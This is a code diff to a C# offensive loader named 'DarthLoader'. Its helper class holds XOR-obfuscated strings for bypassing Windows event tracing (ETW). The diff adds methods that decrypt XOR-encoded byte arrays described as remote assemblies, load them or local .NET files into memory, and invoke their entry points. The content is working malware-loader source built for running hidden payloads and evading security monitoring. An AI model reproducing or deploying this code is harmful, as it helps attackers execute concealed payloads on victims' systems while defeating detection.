@@ -3,12 +3,13 @@
 using System;
 using System.Text;
 using System.Runtime.InteropServices;
+using System.Reflection;
 
 namespace DarthLoader
 {
     class Helpers
     {
-        private static string xorKey = DarthLoader.HelperKey;
+        private static string xorKey = DarthLoader.FunctionsXorKey;
 
         //etwbypass
         public static string etwBypassString = XorString(ConvertHex("11110416101E064241"), xorKey);
@@ -172,6 +173,48 @@ namespace DarthLoader
                 Console.WriteLine("[!] Error converting hex to string!");
             }
             return string.Empty;
+        }
+
+        public static void ExecuteLocalFileArgs(string FilePath, string args)
+        {
+            Assembly dotNetProgram = Assembly.LoadFile(FilePath);
+            string[] assArgs = new string[] { args };
+            dotNetProgram.EntryPoint.Invoke(null, new object[] { assArgs });
+        }
+
+        public static void ExecuteLocalFile(string FilePath)
+        {
+            Assembly dotNetProgram = Assembly.LoadFile(FilePath);
+            dotNetProgram.EntryPoint.Invoke(null, new object[] { null });
+        }
+
+        public static void ExecuteRemoteAssemblyArgs(byte[] programBytes, string xorKey, string args)
+        {
+            try
+            {
+                Assembly dotNetProgram = Assembly.Load(XorBytes(programBytes, xorKey));
+                string[] assArgs = new string[] { args };
+                dotNetProgram.EntryPoint.Invoke(null, new object[] { assArgs });
+            }
+            catch (TargetInvocationException)
+            {
+                Console.WriteLine("[!] Missing arguments for loaded assembly!");
+                Environment.Exit(-1);
+            }
+        }
+
+        public static void ExecuteRemoteAssembly(byte[] programBytes, string xorKey)
+        {
+            try
+            {
+                Assembly dotNetProgram = Assembly.Load(XorBytes(programBytes, xorKey));
+                dotNetProgram.EntryPoint.Invoke(null, new object[] { null });
+            }
+            catch (TargetInvocationException)
+            {
+                Console.WriteLine("[!] Missing arguments for loaded assembly!");
+                Environment.Exit(-1);
+            }
         }
     }
 }
